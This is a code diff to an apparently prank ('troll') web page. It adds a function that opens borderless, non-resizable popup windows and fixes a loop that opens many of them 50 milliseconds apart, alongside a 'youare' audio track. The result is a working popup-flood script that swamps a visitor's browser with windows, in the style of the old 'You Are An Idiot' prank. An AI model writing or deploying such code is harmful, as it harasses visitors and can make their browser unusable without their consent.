@@ -101,12 +101,17 @@
         <source src="/troll/youare.mp3" type="audio/mp3">
     </audio>
     <script>
+        function openWindow(url) {
+	        window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
+        }
+
         async function proCreate(count) {	
 	       for (let i = 0; i < count; i++) {
-	        	openWindow('.troll/lol.html');
+	        	openWindow('/troll/lol.html');
 		        await new Promise(r => setTimeout(r, 50));
 	        }
         }
+        
         document.addEventListener('DOMContentLoaded', function () {
             var audioElement = document.getElementById('youare-audio');
             var carrdLink = document.getElementById('credits');
